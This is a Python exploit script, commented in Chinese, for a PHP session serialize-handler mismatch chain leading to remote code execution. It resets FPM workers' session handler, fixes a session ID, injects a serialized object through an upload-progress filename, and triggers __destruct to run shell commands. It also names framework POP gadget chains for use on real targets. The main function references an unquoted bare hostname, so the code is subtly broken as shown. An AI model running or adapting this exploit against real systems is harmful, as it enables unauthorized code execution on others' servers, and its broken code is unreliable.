#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
CVE-2026-109618 / CVE-2026-109619 - Chain C
Session serialize_handler 不一致 (php_serialize 写入 / php 读取) -> __destruct RCE

链路:
  1. 污染 FPM worker: 请求任何会 ini_set('session.serialize_handler','php_serialize')
     的端点 (Laravel / Symfony / 很多框架都这么干)
  2. Session fixation: 用 POST body 里的 PHPSESSID 字段固定 SID,
     绕过 session.use_only_cookies
  3. 上传: filename = "x|O:4:\"Evil\":1:{...}"
     被 php_serialize 处理器原样写入 session 文件
  4. 同一个 worker 用 php 处理器 (handler=php) 读该 session
     -> 在 "|" 处切分 -> 反序列化注入的对象
  5. 解码尾部有多余数据 => 返回 FAILURE, 但 var_hash 清理
     (PHP_VAR_UNSERIALIZE_DESTROY) 无条件执行 -> __destruct 仍然触发
  6. POP gadget 的 __destruct -> file_put_contents / system / eval -> RCE

关键点: 解码失败也会触发 __destruct。
        文章在 PHP 8.2.34 上验证输出 DESTRUCT! cmd=id; uname -a; hostname
"""

import argparse
import socket
import sys
import time
import uuid


def send_raw(host, port, data, timeout=15):
    s = socket.create_connection((host, port), timeout=timeout)
    s.sendall(data)
    s.settimeout(timeout)
    resp = b""
    while True:
        try:
            d = s.recv(65536)
            if not d:
                break
            resp += d
        except socket.timeout:
            break
        except ConnectionResetError:
            break
    s.close()
    return resp


def step1_pollute_worker(host, port, pollute_path, attempts=10):
    """打那些会把 worker 的 serialize_handler 改成 php_serialize 的端点。"""
    print("[1] 污染 FPM worker: %s" % pollute_path)
    for _ in range(attempts):
        req = (
            "GET %s HTTP/1.1\r\n"
            "Host: %s\r\n"
            "Connection: close\r\n"
            "\r\n" % (pollute_path, host)
        ).encode()
        send_raw(host, port, req)
    print("    已发送 %d 次请求" % attempts)


def step2_inject_session(host, port, upload_path, sid, gadget_payload, attempts=20):
    """把序列化 gadget 塞进 filename, 靠 upload_progress 写进 session 文件。"""
    print("[2] 通过 upload_progress filename 注入 gadget")
    print("    SID   : %s" % sid)
    print("    Gadget: %s..." % gadget_payload[:80])

    boundary = "EXPLOIT"
    escaped_payload = gadget_payload.replace('"', '\\"')
    filename = "x|%s" % escaped_payload

    body = (
        "--%s\r\n"
        'Content-Disposition: form-data; name="PHPSESSID"\r\n\r\n%s\r\n'
        '--%s\r\n'
        'Content-Disposition: form-data; name="PHP_SESSION_UPLOAD_PROGRESS"\r\n\r\nx\r\n'
        '--%s\r\n'
        'Content-Disposition: form-data; name="f"; filename="%s"\r\n'
        "\r\nZ\r\n"
        "--%s--\r\n"
    ) % (boundary, sid, boundary, boundary, filename, boundary)

    data = body.encode("latin-1")
    req = (
        "POST %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Content-Type: multipart/form-data; boundary=%s\r\n"
        "Content-Length: %d\r\n"
        "Cookie: PHPSESSID=%s\r\n"
        "Connection: close\r\n"
        "\r\n" % (upload_path, host, boundary, len(data), sid)
    ).encode() + data

    ok = False
    for _ in range(attempts):
        resp = send_raw(host, port, req)
        if b"200" in resp.split(b"\r\n", 1)[0]:
            ok = True
    print("    已发送 %d 次上传 (尽量命中被污染的 worker)" % attempts)
    return ok


def step3_trigger_destruct(host, port, trigger_path, sid):
    """用 php 处理器读被污染的 SID, 触发 __destruct。"""
    print("[3] 触发 handler 不一致 -> __destruct")
    req = (
        "GET %s HTTP/1.1\r\n"
        "Host: %s\r\n"
        "Cookie: PHPSESSID=%s\r\n"
        "Connection: close\r\n"
        "\r\n" % (trigger_path, host, sid)
    ).encode()
    resp = send_raw(host, port, req)
    status = resp.split(b"\r\n", 1)[0].decode("latin1", "replace") if resp else "NO RESPONSE"
    print("    Status: %s" % status)
    body = resp.split(b"\r\n\r\n", 1)[-1] if b"\r\n\r\n" in resp else b""
    if body:
        print("    Body  : %s" % body[:300].decode("latin1", "replace"))
    return resp


def build_gadget_generic(cmd):
    r"""
    通用 __destruct gadget: 目标上需要一个 class Evil { public $cmd; function __destruct(){ system($this->cmd);} }
    真实目标请换框架 POP 链:
      Laravel  : Illuminate\Broadcasting\PendingBroadcast
      Symfony  : Symfony\Component\Cache\Adapter\TagAwareAdapter
      Monolog  : Monolog\Handler\SyslogUdpHandler + BufferHandler
      WordPress: WP_Object_Cache / 插件 gadget
    """
    return 'O:4:"Evil":1:{s:3:"cmd";s:%d:"%s";}' % (len(cmd), cmd)


def build_gadget_eval(code):
    return 'O:4:"Evil":1:{s:3:"cmd";s:%d:"%s";}' % (len(code), code)


def main():
    ap = argparse.ArgumentParser(description="Chain C: session handler mismatch -> __destruct RCE")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=18080)
    ap.add_argument("--pollute-path", default="/app_serialize.php",
                    help="会 ini_set('session.serialize_handler','php_serialize') 的端点")
    ap.add_argument("--upload-path", default="/nosession.php", help="任意 PHP 端点")
    ap.add_argument("--trigger-path", default="/destruct_test.php", help="用 php handler 调 session_start() 的端点")
    ap.add_argument("--command", default="id > /tmp/rce_proof.txt 2>&1")
    ap.add_argument("--sid", default="")
    ap.add_argument("--gadget", default="", help="自定义序列化 gadget, 覆盖 --command")
    ap.add_argument("--pollute-attempts", type=int, default=10)
    ap.add_argument("--inject-attempts", type=int, default=20)
    args = ap.parse_args()

    sid = args.sid or ("exploit" + uuid.uuid4().hex[:20])
    gadget = args.gadget or build_gadget_generic(args.command)

    print("=" * 60)
    print(" Chain C - Session Serialize Handler Mismatch -> RCE")
    print("=" * 60)
    print(" Target: %s:%d" % (target473.example.com, args.port))
    print(" SID   : %s" % sid)
    print()

    step1_pollute_worker(target473.example.com, args.port, args.pollute_path, args.pollute_attempts)
    print()
    step2_inject_session(target473.example.com, args.port, args.upload_path, sid, gadget, args.inject_attempts)
    print()
    time.sleep(0.5)
    step3_trigger_destruct(target473.example.com, args.port, args.trigger_path, sid)
    print()
    print("[4] 验证: 去目标上看 /tmp/rce_proof.txt")
    print("    真实目标把 Evil gadget 换成框架 POP 链")
    return 0


if __name__ == "__main__":
    sys.exit(main())
